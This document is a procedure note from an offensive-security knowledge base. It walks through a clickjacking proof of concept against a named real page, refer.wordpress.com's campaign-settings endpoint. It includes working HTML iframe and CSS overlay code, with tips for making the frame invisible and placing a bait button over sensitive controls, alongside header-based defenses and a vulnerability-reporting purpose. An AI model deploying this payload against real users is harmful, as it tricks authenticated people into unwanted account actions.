---
id: proc-uuid-1
tags:
  - clickjacking
  - html
  - iframe
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.659Z'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Clickjacking-HTML-PoC

## Summary

This procedure creates a proof-of-concept HTML file that embeds a vulnerable authenticated page from refer.wordpress.com into an iframe, exploiting the absence of clickjacking protections to demonstrate how attackers can overlay malicious elements.

## Description

Clickjacking involves tricking users into clicking on hidden elements by embedding the target site in an iframe on a malicious page. In this case, the refer.wordpress.com affiliate network's campaign-settings page lacks X-Frame-Options or Content-Security-Policy frame-ancestors directives, allowing unrestricted embedding. The procedure builds a simple HTML PoC with a transparent iframe and an overlay button to simulate luring clicks onto sensitive actions like account modifications. Prerequisites include basic HTML knowledge and access to a text editor; no network access is needed for creation, but testing requires authentication to the target site.

## Requirements

1. Text editor (e.g., VS Code, Notepad)
2. Knowledge of HTML and basic CSS for positioning
3. Authenticated session to refer.wordpress.com for later testing

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN headers on all pages
- Use Content-Security-Policy with frame-ancestors 'none' or specific domains
- Monitor for unusual iframe embeddings via web application firewall (WAF) logs

## Objectives

1. Construct a functional PoC demonstrating iframe embedding
2. Prepare for overlay attacks to trick user interactions
3. Validate vulnerability existence for reporting

## Instructions

### Step 1: Set Up HTML Structure

**Context**: Create the base HTML file with an iframe targeting the vulnerable endpoint.

No command required; manually write the file.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
</head>
<body>
    <iframe src="https://refer.wordpress.com/affiliate-network/campaign-settings/"></iframe>
</body>
</html>
```

> This basic structure embeds the page; save as `clickjack-poc.html`.

### Step 2: Add Overlay Styling

**Context**: Use CSS to make the iframe semi-transparent or invisible and add a bait element for click simulation.

Update the file with styles:

```html
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0.5;
        z-index: -1;
    }
    .bait {
        position: absolute;
        top: 100px;
        left: 100px;
        z-index: 1;
    }
</style>
<button class="bait">Click to Proceed</button>
```

> Adjust positions to align bait over target controls; set opacity to 0 for full invisibility.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[clickjacking]]
- [[iframe]]
- [[web-vulnerability]]
